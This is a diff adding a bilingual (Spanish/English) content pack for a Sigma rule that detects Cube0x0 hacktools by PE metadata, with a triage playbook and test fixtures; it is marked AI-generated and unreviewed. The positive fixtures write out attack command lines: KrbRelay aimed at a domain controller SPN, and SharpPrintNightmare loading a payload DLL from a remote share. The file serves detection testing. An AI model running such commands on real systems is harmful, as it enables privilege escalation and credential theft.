@@ -1,0 +1,140 @@
+{
+  "rule": {
+    "id": "37c1333a-a0db-48be-b64b-7393b2386e3b",
+    "title": "Hacktool Execution - PE Metadata",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_hktl_execution_via_pe_metadata.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_execution_via_pe_metadata.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1003",
+      "T1588.002"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó en un endpoint Windows un binario cuyo PE declara la compañía 'Cube0x0', el handle de un autor de herramientas ofensivas públicas. La detección funciona aunque el archivo se haya renombrado.",
+      "what_it_detects": "Eventos de creación de procesos en los que el campo Company de los metadatos PE es exactamente 'Cube0x0'. Ese autor publica herramientas como SharpPrintNightmare, KrbRelay y SharpMapExec y pone su handle en todos sus binarios.",
+      "why_it_matters": "Estas herramientas sirven para escalar privilegios, retransmitir autenticación Kerberos, robar credenciales y moverse lateralmente. Corresponde a T1588.002 (obtener herramientas) y T1003 (volcado de credenciales). Que una se ejecute suele indicar actividad práctica de un atacante o un pentest.",
+      "triage_steps": [
+        "Revise Image, OriginalFileName, Product y Description para identificar la herramienta concreta, aunque el nombre del archivo se haya cambiado.",
+        "Analice CommandLine para ver objetivos, servidores, credenciales o módulos que se pasaron como argumentos (por ejemplo, hosts remotos o SPN).",
+        "Revise ParentImage y la cadena de procesos padre: ¿salió de cmd, powershell, una sesión RDP o un proceso de servicio?",
+        "Confirme el User y si el proceso corrió con privilegios elevados o como SYSTEM.",
+        "Busque el hash en su inteligencia de amenazas y en otros endpoints para ver si se distribuyó a más equipos.",
+        "En el mismo host, revise los eventos de +/- 15 minutos: creación de archivos, conexiones de red, actividad de spooler, tickets Kerberos y logons nuevos.",
+        "Verifique si existe un pentest o ejercicio de red team autorizado que cubra este host y este usuario."
+      ],
+      "false_positives": [
+        "Pruebas de penetración o ejercicios de red team autorizados que usen herramientas de Cube0x0.",
+        "Investigadores de seguridad o analistas que prueban estas herramientas en equipos de laboratorio mal segmentados."
+      ],
+      "response_steps": [
+        "Si no hay un ejercicio autorizado, aísle el endpoint y preserve el binario, su hash y la memoria del proceso.",
+        "Restablezca las credenciales del usuario implicado y de las cuentas que aparezcan en CommandLine; revise los tickets Kerberos emitidos.",
+        "Investigue los hosts que aparezcan como objetivos en los argumentos y busque persistencia o movimiento lateral.",
+        "Elimine el binario solo después de documentarlo y restaure el equipo a partir de una imagen confiable si se confirma el compromiso."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque el metadato identifica herramientas exclusivamente ofensivas, y fuera de un ejercicio autorizado casi no hay usos legítimos."
+    },
+    "en": {
+      "summary": "A binary whose PE header lists the company 'Cube0x0', the handle of an author of public offensive tools, ran on a Windows endpoint. The rule still fires if the file was renamed.",
+      "what_it_detects": "Process creation events where the PE metadata Company field is exactly 'Cube0x0'. This author ships tools such as SharpPrintNightmare, KrbRelay and SharpMapExec and puts the handle in all of those binaries.",
+      "why_it_matters": "These tools are used for privilege escalation, Kerberos authentication relay, credential theft and lateral movement. This maps to T1588.002 (obtaining tools) and T1003 (credential dumping). One running usually means hands-on attacker activity or a pentest.",
+      "triage_steps": [
+        "Check Image, OriginalFileName, Product and Description to identify the exact tool, even if the file name was changed.",
+        "Read CommandLine for targets, servers, credentials or modules passed as arguments, such as remote hosts or SPNs.",
+        "Review ParentImage and the process tree: did it come from cmd, PowerShell, an RDP session or a service process?",
+        "Confirm the User and whether the process ran elevated or as SYSTEM.",
+        "Look up the hash in threat intel and across other endpoints to see whether it was spread to more machines.",
+        "On the same host within +/- 15 minutes, review file writes, network connections, spooler activity, Kerberos tickets and new logons.",
+        "Check whether an authorized pentest or red team exercise covers this host and user."
+      ],
+      "false_positives": [
+        "Authorized penetration tests or red team exercises that use Cube0x0 tools.",
+        "Security researchers or analysts testing these tools on lab machines that are not properly segmented."
+      ],
+      "response_steps": [
+        "If no exercise is authorized, isolate the endpoint and preserve the binary, its hash and the process memory.",
+        "Reset credentials for the involved user and any accounts seen in CommandLine; review Kerberos tickets that were issued.",
+        "Investigate hosts named as targets in the arguments and look for persistence or lateral movement.",
+        "Remove the binary only after you document it, and reimage from a trusted image if compromise is confirmed."
+      ],
+      "severity_rationale": "High fits because this metadata marks tools that are offensive by design, and outside an authorized exercise they have almost no legitimate use."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Renamed KrbRelay binary run from a user's temp folder; PE Company is Cube0x0",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Local\\Temp\\svcupd.exe",
+          "OriginalFileName": "KrbRelay.exe",
+          "Product": "KrbRelay",
+          "Description": "KrbRelay",
+          "Company": "Cube0x0",
+          "CommandLine": "svcupd.exe -spn ldap/dc01.andes.example.com -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "SharpPrintNightmare run from PowerShell, company value in lowercase (Sigma matching is case-insensitive)",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE-02.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\ProgramData\\spn.exe",
+          "OriginalFileName": "SharpPrintNightmare.exe",
+          "Product": "SharpPrintNightmare",
+          "Company": "cube0x0",
+          "CommandLine": "spn.exe \\\\192.0.2.15\\share\\payload.dll",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate Microsoft print utility; Company is Microsoft Corporation",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\PrintIsolationHost.exe",
+          "OriginalFileName": "PrintIsolationHost.exe",
+          "Product": "Microsoft® Windows® Operating System",
+          "Company": "Microsoft Corporation",
+          "CommandLine": "C:\\Windows\\System32\\PrintIsolationHost.exe -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "Internal tool whose Company only contains the string but is not exactly Cube0x0, so the exact-match selection does not fire",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Tools\\inventario.exe",
+          "OriginalFileName": "inventario.exe",
+          "Product": "Inventario",
+          "Company": "Cube0x0 Fan Labs Example",
+          "CommandLine": "inventario.exe --report",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
